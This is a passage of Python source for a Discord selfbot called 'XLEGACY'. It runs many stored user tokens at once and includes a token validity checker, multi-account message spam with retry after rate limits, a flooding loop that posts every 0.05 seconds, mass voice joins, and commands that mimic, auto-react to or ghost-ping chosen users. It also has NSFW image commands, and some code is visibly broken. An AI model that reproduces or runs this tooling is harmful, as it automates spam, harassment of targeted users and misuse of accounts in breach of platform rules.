                    print("Too many consecutive failures, stopping multilast")
                    multilast_running = False
                    await ctx.send("```Multilast stopped due to too many errors```")
                    break
                    
            except Exception as e:
                print(f"Error in multilast loop: {e}")
                await asyncio.sleep(1)
                continue

    try:
        task = bot.loop.create_task(multilast_loop())
        multilast_tasks[(user.id, ctx.channel.id)] = task
        await ctx.send(await ctx.send(f"```ansi\n{red} XLEGACY | OUTLAST STARTED | DONT FOLD {reset}\n```"))
    except Exception as e:
        multilast_running = False
        print(f"Failed to start multilast: {e}")
        await ctx.send("```Failed to start multilast```")

@bot.command()
async def stopmultilast(ctx):
    global multilast_running
    if multilast_running:
        multilast_running = False
        channel_id = ctx.channel.id
        tasks_to_stop = [key for key in multilast_tasks.keys() if key[1] == channel_id]
        
        for task_key in tasks_to_stop:
            task = multilast_tasks.pop(task_key)
            task.cancel()
            
        await ctx.send("```The multilast session has been stopped```")
    else:
        await ctx.send("```No multilast session is currently running```")

# Configuration command for multilast
@bot.command()
async def multilastconfig(ctx, token_count: int = None, delay: float = None):
    global multilast_config
    
    if token_count is not None:
        multilast_config["token_count"] = token_count
    if delay is not None:
        multilast_config["delay"] = delay
        
    
    await ctx.send(f"```Multilast configuration updated:\nToken Count: {multilast_config['token_count']}\nDelay: {multilast_config['delay']}```")
@bot.command()
async def tok(ctx):
    tokens_list = load_tokens()
    if not tokens_list:
        await ctx.send("```No tokens found in token.txt```")
        return

    async def get_token_status(token):
        try:
            # Use a simple session to check token validity
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get('https://discord.com/api/v9/users/@me', headers=headers) as response:
                    if response.status == 200:
                        user_data = await response.json()
                        username = f"{user_data['username']}#{user_data['discriminator']}"
                        return {"username": username, "active": True}
                    else:
                        return {"username": f"Invalid token ending in {token[-4:]}", "active": False}
                        
        except Exception as e:
            return {"username": f"Error with token {token[-4:]}: {str(e)}", "active": False}

    loading_message = await ctx.send("```Fetching token statuses...```")
    
    usernames = []
    active_count = 0

    page_char_limit = 2000

    for i, token in enumerate(tokens_list, 1):
        status = await get_token_status(token)
        username = status["username"]
        token_state = f"{light_green}(active){reset}" if status["active"] else f"{light_red}(locked){reset}"
        
        if status["active"]:
            active_count += 1
            
        usernames.append(f"{light_red}[ {red}{i}{light_red} ] {black}{username} {token_state}")

        page_content = "\n".join(usernames[-(page_char_limit // 50):])  
        progress_message = f"{red}T O K E N  S T A T U S{reset}\n\n{page_content}\n\n{light_red}Active tokens: {red}{active_count}{light_red}/{red}{len(tokens_list)}{reset}"
        
        await loading_message.edit(content=f"```ansi\n{progress_message}```")
        await asyncio.sleep(0.5)  # Reduced delay to speed up checking

    final_message = f"{red}T O K E N S{reset}\n" + "\n".join(usernames) + f"\n\n{light_red}Total active tokens: {red}{active_count}{light_red}/{red}{len(tokens_list)}{reset}"
    
    # Split into pages if needed
    if len(final_message) > page_char_limit:
        for part in [final_message[i:i+page_char_limit] for i in range(0, len(final_message), page_char_limit)]:
            await loading_message.edit(content=f"```ansi\n{part}```")
    else:
        await loading_message.edit(content=f"```ansi\n{final_message}```")

# Add this with your other global variables at the top
active_clients = []

@bot.command()
async def multivc(ctx, channel_id: int):
    """Connect multiple tokens to a voice channel"""
    tokens = load_tokens()
    
    if not tokens:
        await ctx.send("```No tokens found in token.txt```")
        return

    async def connect_voice(token):
        try:
            intents = discord.Intents.default()
            intents.voice_states = True
            client = commands.Bot(command_prefix='.', self_bot=True, intents=intents)

            @client.event
            async def on_ready():
                try:
                    channel = client.get_channel(channel_id)
                    if channel and isinstance(channel, discord.VoiceChannel):
                        voice = await channel.connect()
                        active_clients.append(client)
                        print(f"{red}Connected to voice with token ending in {token[-4:]}{reset}")
                    else:
                        print(f"{light_red}Voice channel not found for token ending in {token[-4:]}{reset}")
                except Exception as e:
                    print(f"{light_red}Error connecting token {token[-4:]}: {e}{reset}")

            await client.start(token, bot=False)

        except Exception as e:
            print(f"{light_red}Error with token {token[-4:]}: {e}{reset}")

    tasks = [connect_voice(token) for token in tokens]
    status_msg = await ctx.send(f"```ansi\n{red}Connecting {len(tasks)} tokens to voice channel {channel_id}```")
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Update status message
    await status_msg.edit(content=f"```ansi\n{red}Successfully connected {len(tokens)} tokens to voice channel {channel_id}```")

@bot.command()
async def vcend(ctx, channel_id: int):
    """Disconnect multiple tokens from a voice channel"""
    tokens = load_tokens()
    
    if not tokens:
        await ctx.send("```No tokens found in token.txt```")
        return

    async def disconnect_voice(token):
        try:
            intents = discord.Intents.default()
            intents.voice_states = True
            client = commands.Bot(command_prefix='.', self_bot=True, intents=intents)

            @client.event
            async def on_ready():
                try:
                    channel = client.get_channel(channel_id)
                    if channel:
                        for vc in client.voice_clients:
                            if vc.channel and vc.channel.id == channel_id:
                                await vc.disconnect()
                                print(f"{red}Disconnected token ending in {token[-4:]}{reset}")
                    else:
                        print(f"{light_red}Voice channel not found for token ending in {token[-4:]}{reset}")
                except Exception as e:
                    print(f"{light_red}Error disconnecting token {token[-4:]}: {e}{reset}")
                finally:
                    await client.close()

            await client.start(token, bot=False)

        except Exception as e:
            print(f"{light_red}Error with token {token[-4:]}: {e}{reset}")

    tasks = [disconnect_voice(token) for token in tokens]
    status_msg = await ctx.send(f"```ansi\n{red}Disconnecting {len(tasks)} tokens from voice channel {channel_id}```")
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Update status message
    await status_msg.edit(content=f"```ansi\n{red}Successfully disconnected {len(tokens)} tokens from voice channel {channel_id}```")

@bot.command()
async def vcstop(ctx):
    """Stop all voice connections for all tokens"""
    global active_clients
    
    if not active_clients:
        await ctx.send("```No active voice connections found```")
        return
    
    disconnected_count = 0
    for client in active_clients:
        try:
            for voice_client in client.voice_clients:
                await voice_client.disconnect()
                disconnected_count += 1
        except Exception as e:
            print(f"{light_red}Error disconnecting client: {e}{reset}")
    
    active_clients.clear()
    await ctx.send(f"```ansi\n{red}Disconnected {disconnected_count} voice clients```")

    


@bot.command()
async def nsfw(ctx):
    msg = await ctx.send(f"```ansi\n{red} XLEGACY | NSFW COMMANDS {reset}\n```")
    help_content = fr"""
                {black}─────────────────────────────────────XLEGACY─────────────────────────
                           {red} ──────────────────── XLEGACY |  MADE BY @unholxy {light_red} V.1 ────────────────────
                {black}─────────────────────────────────────NSFW─────────────────────────{red}

{red}NSFW Image Commands{reset}
{light_red}[ {red}1{light_red} ] {black}ecchi              {light_red}[ {red}2{light_red} ] {black}hentai             {light_red}[ {red}3{light_red} ] {black}uniform
{light_red}[ {red}4{light_red} ] {black}maid               {light_red}[ {red}5{light_red} ] {black}oppai              {light_red}[ {red}6{light_red} ] {black}selfies
{light_red}[ {red}7{light_red} ] {black}raiden             {light_red}[ {red}8{light_red} ] {black}marin

{red}
 __   ___      ______ _____          _______     __
 \ \ / / |    |  ____/ ____|   /\   / ____\ \   / /
  \ V /| |    | |__ | |  __   /  \ | |     \ \_/ / 
   > < | |    |  __|| | |_ | / /\ \| |      \   /  
  / . \| |____| |___| |__| |/ ____ \ |____   | |   
 /_/ \_\______|______\_____/_/    \_\_____|  |_|   
                                                   
                                                   
  
                                          


"""
    await msg.edit(content=f"```ansi\n{help_content}\n```")
@bot.command(name="ecchi")
async def ecchi(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=ecchi&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SHARES SOME ECCHI |  {reset}\n```\n[XLEGACY SB]({image_url})")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH IMAGE |  {reset}\n```")

@bot.command(name="hentai")
async def hentai(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=hentai&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SHARES SOME HENTAI |  {reset}\n```\n[XLEGACY SB]({image_url})")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH IMAGE |  {reset}\n```")

@bot.command(name="uniform")
async def uniform(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=uniform&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SHARES UNIFORM CONTENT |  {reset}\n```\n[XLEGACY SB]({image_url})")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH IMAGE |  {reset}\n```")

@bot.command(name="maid")
async def maid(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=maid&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SHARES MAID CONTENT |  {reset}\n```\n[XLEGACY SB]({image_url})")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH IMAGE |  {reset}\n```")

@bot.command(name="oppai")
async def oppai(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=oppai&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SHARES OPPAI CONTENT |  {reset}\n```\n[XLEGACY SB]({image_url})")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH IMAGE |  {reset}\n```")

@bot.command(name="selfies")
async def selfies(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=selfies&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SHARES SELFIES |  {reset}\n```\n[XLEGACY SB]({image_url})")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH IMAGE |  {reset}\n```")

@bot.command(name="raiden")
async def raiden(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=raiden-shogun&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SHARES RAIDEN CONTENT |  {reset}\n```\n[XLEGACY SB]({image_url})")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH IMAGE |  {reset}\n```")

@bot.command(name="marin")
async def marin(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=marin-kitagawa&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SHARES MARIN CONTENT |  {reset}\n```\n[XLEGACY SB]({image_url})")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH IMAGE |  {reset}\n```")


@bot.command()
async def misc(ctx):
    msg2 = await ctx.send("Loading.")
    help_content2 = fr"""
{red}User Interaction{reset}
{light_red}[ {red}42{light_red} ] {black}pfpscrape <num>    {light_red}[ {red}43{light_red} ] {black}triggertyping <dur> {light_red}[ {red}44{light_red} ] {black}triggertypingoff
{light_red}[ {red}45{light_red} ] {black}ghostping <@user>  {light_red}[ {red}46{light_red} ] {black}ghostrole          {light_red}[ {red}47{light_red} ] {black}token
{light_red}[ {red}48{light_red} ] {black}forcedc            {light_red}[ {red}49{light_red} ] {black}dreact            {light_red}[ {red}50{light_red} ] {black}mspam

{red}Message & Reaction{reset}
{light_red}[ {red}51{light_red} ] {black}webhookcopy        {light_red}[ {red}52{light_red} ] {black}webhookcopyoff     {light_red}[ {red}53{light_red} ] {black}avatar

{red}Server Management{reset}
{light_red}[ {red}54{light_red} ] {black}tempchannel <name> {light_red}[ {red}55{light_red} ] {black}tempvc <name>      {light_red}[ {red}56{light_red} ] {black}roblox <username>
{light_red}[ {red}57{light_red} ] {black}servername <name>  {light_red}[ {red}58{light_red} ] {black}pin               {light_red}[ {red}59{light_red} ] {black}createchannel
{light_red}[ {red}60{light_red} ] {black}createvc          {light_red}[ {red}61{light_red} ] {black}createrole        {light_red}[ {red}62{light_red} ] {black}servername

{red}
 __   ___      ______ _____          _______     __
 \ \ / / |    |  ____/ ____|   /\   / ____\ \   / /
  \ V /| |    | |__ | |  __   /  \ | |     \ \_/ / 
   > < | |    |  __|| | |_ | / /\ \| |      \   /  
  / . \| |____| |___| |__| |/ ____ \ |____   | |   
 /_/ \_\______|______\_____/_/    \_\_____|  |_|   

"""

@bot.command()

async def scrapeconfig(ctx):
    """View and manage scraped PFP folders"""
    base_dir = r'selfbot\main.py'
    
    if not os.path.exists(base_dir):
        await ctx.send(f"```ansi\n{red} XLEGACY | NO PFP FOLDER FOUND |  {reset}\n```")
        return
    
    # Get all scrape folders
    folders = []
    for item in os.listdir(base_dir):
        item_path = os.path.join(base_dir, item)
        if os.path.isdir(item_path) and item.startswith('scrape_'):
            folders.append(item)
    
    if not folders:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO SCRAPED FOLDERS FOUND |  {reset}\n```")
        return
    
    # Sort folders by creation time (newest first)
    folders.sort(key=lambda x: os.path.getctime(os.path.join(base_dir, x)), reverse=True)
    
    # Count files in each folder
    folder_info = []
    for folder in folders:
        folder_path = os.path.join(base_dir, folder)
        file_count = len([f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))])
        folder_info.append((folder, file_count))
    
    # Create formatted list
    folder_list = []
    for i, (folder, count) in enumerate(folder_info, 1):
        folder_list.append(f"{light_red}[ {red}{i}{light_red} ] {black}{folder} - {red}{count}{black} files{reset}")
    
    # Split into pages if too long
    page_content = "\n".join(folder_list)
    
    help_content = fr"""
{red}SCRAPED PFP FOLDERS{reset}

{page_content}

{light_red}Commands:{reset}
{light_red}[ {red}1{light_red} ] {black}Create new scrape folder{reset}
{light_red}[ {red}2{light_red} ] {black}Delete specific folder{reset}
{light_red}[ {red}3{light_red} ] {black}Delete all folders{reset}

{light_red}Reply with number to choose option{reset}
"""
    
    msg = await ctx.send(f"```ansi\n{help_content}\n```")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content in ['1', '2', '3']
    
    try:
        response = await bot.wait_for('message', timeout=30.0, check=check)
        
        if response.content == '1':
            # Create new folder
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            new_folder = f'scrape_{timestamp}'
            new_folder_path = os.path.join(base_dir, new_folder)
            os.makedirs(new_folder_path, exist_ok=True)
            await ctx.send(f"```ansi\n{red} XLEGACY | CREATED FOLDER: {new_folder} |  {reset}\n```")
            
        elif response.content == '2':
            # Delete specific folder
            await ctx.send(f"```ansi\n{red} XLEGACY | REPLY WITH FOLDER NUMBER TO DELETE |  {reset}\n```")
            
            def folder_check(m):
                return m.author == ctx.author and m.channel == ctx.channel and m.content.isdigit()
            
            try:
                folder_response = await bot.wait_for('message', timeout=30.0, check=folder_check)
                folder_num = int(folder_response.content)
                
                if 1 <= folder_num <= len(folders):
                    folder_to_delete = folders[folder_num - 1]
                    folder_path = os.path.join(base_dir, folder_to_delete)
                    
                    # Count files before deletion
                    file_count = len([f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))])
                    
                    # Delete folder and contents
                    shutil.rmtree(folder_path)
                    await ctx.send(f"```ansi\n{red} XLEGACY | DELETED FOLDER: {folder_to_delete} ({file_count} files) |  {reset}\n```")
                else:
                    await ctx.send(f"```ansi\n{red} XLEGACY | INVALID FOLDER NUMBER |  {reset}\n```")
                    
            except asyncio.TimeoutError:
                await ctx.send(f"```ansi\n{red} XLEGACY | TIMEOUT | NO RESPONSE RECEIVED |  {reset}\n```")
                
        elif response.content == '3':
            # Delete all folders
            total_folders = len(folders)
            total_files = 0
            
            for folder in folders:
                folder_path = os.path.join(base_dir, folder)
                file_count = len([f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))])
                total_files += file_count
                shutil.rmtree(folder_path)
            
            await ctx.send(f"```ansi\n{red} XLEGACY | DELETED ALL {total_folders} FOLDERS ({total_files} FILES) |  {reset}\n```")
            
    except asyncio.TimeoutError:
        await ctx.send(f"```ansi\n{red} XLEGACY | TIMEOUT | NO RESPONSE RECEIVED |  {reset}\n```")

@bot.command()
async def scrapedelete(ctx, folder_name: str = None):
    """Delete specific scraped PFP folders"""
    base_dir = r'\selfbot\pfps'
    
    if not os.path.exists(base_dir):
        await ctx.send(f"```ansi\n{red} XLEGACY | NO PFP FOLDER FOUND |  {reset}\n```")
        return
    
    if folder_name is None:
        # Show available folders
        folders = []
        for item in os.listdir(base_dir):
            item_path = os.path.join(base_dir, item)
            if os.path.isdir(item_path) and item.startswith('scrape_'):
                folders.append(item)
        
        if not folders:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO SCRAPED FOLDERS FOUND |  {reset}\n```")
            return
        
        folder_list = []
        for i, folder in enumerate(folders, 1):
            folder_path = os.path.join(base_dir, folder)
            file_count = len([f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))])
            folder_list.append(f"{light_red}[ {red}{i}{light_red} ] {black}{folder} - {red}{file_count}{black} files{reset}")
        
        content = fr"""
{red}AVAILABLE FOLDERS TO DELETE{reset}

{"\n".join(folder_list)}

{light_red}Usage: {black}.scrapedelete <folder_name>{reset}
{light_red}Example: {black}.scrapedelete scrape_20241201_143022{reset}
"""
        await ctx.send(f"```ansi\n{content}\n```")
        return
    
    # Delete specific folder
    folder_path = os.path.join(base_dir, folder_name)
    
    if not os.path.exists(folder_path):
        await ctx.send(f"```ansi\n{red} XLEGACY | FOLDER NOT FOUND: {folder_name} |  {reset}\n```")
        return
    
    if not os.path.isdir(folder_path):
        await ctx.send(f"```ansi\n{red} XLEGACY | NOT A VALID FOLDER: {folder_name} |  {reset}\n```")
        return
    
    # Count files before deletion
    file_count = len([f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))])
    
    # Delete folder and contents
    shutil.rmtree(folder_path)
    await ctx.send(f"```ansi\n{red} XLEGACY | DELETED FOLDER: {folder_name} ({file_count} files) |  {reset}\n```")

# Add these to your global variables
autoreact_users = {}
mimic_user = None
cord_mode = False
cord_user = None
spammings = False
spammingss = False
editspamming = False

@bot.command()
async def autoreact(ctx, user: discord.User, emoji: str):
    autoreact_users[user.id] = emoji
    await ctx.send(f"```ansi\n{red} XLEGACY | AUTOREACT ENABLED | {emoji} TO {user.name} |  {reset}\n```")

@bot.event
async def on_message(message):
    # Process commands differently for owner vs hosted users
    try:
        if message.author == bot.user:
            await bot.process_commands(message)
            return

        # If a hosted user sent the message and it looks like a command, invoke it directly
        if (str(message.author.id) in hosted_users) or (message.author.id in hosted_users):
            ctx = await bot.get_context(message)
            if ctx.command:
                # Execute the command as the bot owner so hosted users can access owner-only commands
                ctx.author = bot.user
                await bot.invoke(ctx)
                return

        # Default processing for other messages
        await bot.process_commands(message)
    except Exception as e:
        print(f"{light_red}Error in on_message: {e}{reset}")
    
    # Check if autoreact is enabled for this user
    if message.author.id in autoreact_users:
        try:
            emoji = autoreact_users[message.author.id]
            # Try to react with the emoji
            await message.add_reaction(emoji)
            print(f"{red}Autoreacted with {emoji} to {message.author.name}'s message{reset}")
        except discord.HTTPException as e:
            if e.status == 429:
                # Rate limited, wait and retry
                retry_after = e.retry_after
                print(f"{light_red}Rate limited on autoreact, waiting {retry_after}s{reset}")
                await asyncio.sleep(retry_after)
                try:
                    await message.add_reaction(emoji)
                except:
                    pass
            else:
                print(f"{light_red}Failed to autoreact: {e}{reset}")
        except Exception as e:
            print(f"{light_red}Error in autoreact: {e}{reset}")

        # (Hosted invocations are handled above) - no need to double-invoke


    async def _delayed_delete_message(message, delay=3):
        """Delete a provided message after a delay, ignoring failures."""
        try:
            await asyncio.sleep(delay)
            await message.delete()
        except Exception:
            return


    @bot.event
    async def on_command_completion(ctx):
        """After a command completes, schedule deletion of any bot-sent messages in the channel that were created after the invoking user message."""
        try:
            # Look for bot messages sent after the command invocation and delete them after a small delay
            # Also schedule deletion of the invoking message if it was authored by the bot (so the owner's command disappears)
            if ctx.message.author == bot.user:
                asyncio.create_task(_delayed_delete_message(ctx.message, 3))
            # Try to delete hosted user command messages if the bot has permissions
            try:
                if ((str(ctx.message.author.id) in hosted_users) or (ctx.message.author.id in hosted_users)) and ctx.guild is not None:
                    perms = ctx.channel.permissions_for(ctx.guild.me)
                    if perms and perms.manage_messages:
                        asyncio.create_task(_delayed_delete_message(ctx.message, 3))
            except Exception:
                pass

            async for message in ctx.channel.history(limit=25, after=ctx.message.created_at):
                if message.author == bot.user:
                    # don't block the event loop - schedule deletion
                    asyncio.create_task(_delayed_delete_message(message, 3))
        except Exception:
            # Just ignore any failures here
            pass
@bot.command()
async def autoreactoff(ctx, user: discord.User):
    if user.id in autoreact_users:
        del autoreact_users[user.id]
        await ctx.send(f"```ansi\n{red} XLEGACY | AUTOREACT DISABLED | {user.name} |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO AUTOREACT FOUND | {user.name} |  {reset}\n```")
@bot.command()
async def say(ctx, *, message: str):
    tokens = load_tokens()
    channel_id = ctx.channel.id
    parts = message.split(" ", 1)

    try:
        token_index = int(parts[0])
        if len(parts) < 2:
            await ctx.send(f"```ansi\n{red} XLEGACY | SPECIFY MESSAGE AFTER TOKEN INDEX |  {reset}\n```")
            return

        actual_message = parts[1]  
        if token_index < 1 or token_index > len(tokens):
            await ctx.send(f"```ansi\n{red} XLEGACY | INVALID TOKEN INDEX |  {reset}\n```")
            return

        token = tokens[token_index - 1]  
        tokens_to_use = [token]  
    except ValueError:
        actual_message = message
        tokens_to_use = tokens

    async def send_message(token, message):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        payload = {
            'content': message
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=payload) as resp:
                if resp.status == 200:
                    print(f"{red}Message sent with token: {token[-4:]}{reset}")
                elif resp.status == 429:
                    retry_after = int(resp.headers.get("Retry-After", 1))
                    print(f"{light_red}Rate limited with token: {token[-4:]}. Retrying after {retry_after} seconds...{reset}")
                    await asyncio.sleep(retry_after)
                    await send_message(token, message)
                else:
                    print(f"{light_red}Failed to send message with token: {token[-4:]}. Status code: {resp.status}{reset}")

    tasks = [send_message(token, actual_message) for token in tokens_to_use]
    await asyncio.gather(*tasks)
    
    if len(tokens_to_use) == 1:
        await ctx.send(f"```ansi\n{red} XLEGACY | MESSAGE SENT BY TOKEN {token_index} |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | MESSAGE SENT BY ALL TOKENS |  {reset}\n```")

@bot.command()
async def mspam(ctx, *, messages: str):
    global spammings
    spammings = True
    channel_id = ctx.channel.id
    await ctx.send(f"```ansi\n{red} XLEGACY | MSPAM STARTED | ALL TOKENS |  {reset}\n```")

    message_list = [msg.strip() for msg in messages.split(',')]
    tokens = load_tokens()

    failed_tokens = {}
    active_tokens = set(tokens)

    async def send_message(token, message):
        nonlocal active_tokens
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        payload = {
            'content': message
        }
        
        retry_count = 0
        
        async with aiohttp.ClientSession() as session:
            while spammings and token in active_tokens:
                try:
                    current_delay = 1.5 + random.uniform(0, 0.5)
                    
                    async with session.post(
                        f'https://discord.com/api/v9/channels/{channel_id}/messages',
                        headers=headers,
                        json=payload
                    ) as resp:
                        if resp.status == 200:
                            print(f"{red}Message sent with token: {token[-4:]} - Content: {message}{reset}")
                            retry_count = 0  
                            
                        elif resp.status == 429:  
                            retry_after = float(resp.headers.get("Retry-After", "1.0"))
                            print(f"{light_red}Rate limited with token: {token[-4:]}. Retrying after {retry_after} seconds...{reset}")
                            await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                            continue
                            
                        else:
                            print(f"{light_red}Error with token {token[-4:]}: Status code {resp.status}{reset}")
                            retry_count += 1
                            
                            if retry_count >= 3:
                                print(f"{light_red}Token {token[-4:]} failed 3 times, deactivating.{reset}")
                                active_tokens.remove(token)
                                failed_tokens[token] = retry_count
                                break
                                
                            await asyncio.sleep(current_delay * 2) 
                            continue

                    await asyncio.sleep(current_delay)

                except Exception as e:
                    print(f"{light_red}Unexpected error with token {token[-4:]}: {str(e)}{reset}")
                    retry_count += 1
                    if retry_count >= 3:
                        print(f"{light_red}Token {token[-4:]} failed 3 times, deactivating.{reset}")
                        active_tokens.remove(token)
                        failed_tokens[token] = retry_count
                        break
                    await asyncio.sleep(current_delay * 2)

    try:
        tasks = [send_message(token, message_list[i % len(message_list)]) 
                for i, token in enumerate(tokens)]
        await asyncio.gather(*tasks)

        if not active_tokens:
            await ctx.send(f"```ansi\n{red} XLEGACY | ALL TOKENS FAILED | STOPPING SPAM |  {reset}\n```")
            spammings = False
        elif len(failed_tokens) > 0:
            failed_count = len(failed_tokens)
            await ctx.send(f"```ansi\n{red} XLEGACY | SPAM CONTINUING | {len(active_tokens)} TOKENS | {failed_count} FAILED |  {reset}\n```")

    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {str(e)} |  {reset}\n```")
        spammings = False

    if spammings:
        await ctx.send(f"```ansi\n{red} XLEGACY | SPAM IN PROGRESS | USE .MSPAMOFF TO STOP |  {reset}\n```")

@bot.command()
async def mspamoff(ctx):
    global spammings
    spammings = False  
    await ctx.send(f"```ansi\n{red} XLEGACY | MSPAM STOPPED |  {reset}\n```")

@bot.command()
async def spam(ctx, *, message: str):
    global spammingss
    spammingss = True 
    await ctx.send(f"```ansi\n{red} XLEGACY | SPAM STARTED | '{message}' |  {reset}\n```")

    while spammingss:  
        await ctx.send(message) 
        await asyncio.sleep(0.05)

@bot.command()
async def spamoff(ctx):
    global spammingss
    spammingss = False 
    await ctx.send(f"```ansi\n{red} XLEGACY | SPAM STOPPED |  {reset}\n```")

@bot.command()
async def cord(ctx, user: discord.User):
    global cord_mode, cord_user
    cord_mode = True
    cord_user = user
    await ctx.send(f"```ansi\n{red} XLEGACY | CORD MODE ENABLED | {user.name} |  {reset}\n```")

@bot.command()
async def cordoff(ctx):
    global cord_mode, cord_user
    cord_mode = False
    cord_user = None
    await ctx.send(f"```ansi\n{red} XLEGACY | CORD MODE DISABLED |  {reset}\n```")

@bot.command()
async def mimic(ctx, user: discord.Member):
    global mimic_user
    mimic_user = user 
    await ctx.send(f"```ansi\n{red} XLEGACY | MIMIC ENABLED | {user.display_name} |  {reset}\n```")

@bot.command()
async def mimicoff(ctx):
    global mimic_user
    mimic_user = None 
    await ctx.send(f"```ansi\n{red} XLEGACY | MIMIC DISABLED |  {reset}\n```")

@bot.command()
async def clearmsg(ctx, limit: int):
    await ctx.message.delete() 
    
    deleted_count = 0
    async for message in ctx.channel.history(limit=limit):
        if message.author == ctx.author:  
            try:
                await message.delete()
                deleted_count += 1
            except discord.HTTPException:
                print(f"{light_red}Failed to delete message {message.id}{reset}")
    
    await ctx.send(f"```ansi\n{red} XLEGACY | PURGED {deleted_count} MESSAGES |  {reset}\n```", delete_after=5)

@bot.command()
async def nickname(ctx, *, new_nickname: str):
    if ctx.guild:
        try:
            await ctx.guild.me.edit(nick=new_nickname)
            await ctx.send(f"```ansi\n{red} XLEGACY | NICKNAME CHANGED | {new_nickname} |  {reset}\n```")
        except discord.Forbidden:
            await ctx.send(f"```ansi\n{red} XLEGACY | CANNOT CHANGE NICKNAME |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | SERVER ONLY COMMAND |  {reset}\n```")

        # Add these to your global variables
webhookcopy_status = {}
webhook_urls = {}
dreact_users = {}
forced_disconnections = {}
popout_status = {}

@bot.command(aliases=['si'])
async def serverinfo(ctx):
    server = ctx.guild

    try:
        owner = server.owner
        if owner is None:
            owner = await server.fetch_member(server.owner_id)  
        owner_field = f"{white}{owner.name}\n                                {red}ID: {white}{owner.id}"
    except Exception as e:
        owner_field = f"Error fetching owner: {str(e)}"
        print(f"{light_red}Error fetching owner info for guild {server.name}: {e}{reset}")

    creation_date = server.created_at
    formatted_creation = f"{creation_date.strftime('%Y-%m-%d')} (Created {time_since(creation_date)})"

    total_members = server.member_count
    humans = sum(1 for member in server.members if not member.bot)
    bots = total_members - humans
    members_field = f"                                {red}Total: {white}{total_members}\n                                {red}Humans: {white}{humans}\n                                {red}Bots: {white}{bots}"

    text_channels = len([channel for channel in server.channels if isinstance(channel, discord.TextChannel)])
    voice_channels = len([channel for channel in server.channels if isinstance(channel, discord.VoiceChannel)])
    categories = len([channel for channel in server.channels if isinstance(channel, discord.CategoryChannel)])
    channels_field = f"                                {red}Text: {white}{text_channels}\n                                {red}Voice: {white}{voice_channels}\n                                {red}Categories: {white}{categories}"

    total_roles = len(server.roles)
    total_emojis = len(server.emojis)
    total_boosters = server.premium_subscription_count
    roles_field = f"                                {red}Roles: {white}{total_roles}\n                                {red}Emojis: {white}{total_emojis}"

    verification_level = server.verification_level
    boost_level = server.premium_tier
    information_field = f"                                {red}Verification: {white}{verification_level}\n                                {red}Boost level: {white}{boost_level}\n                                {red}Boosts: {white}{total_boosters}"

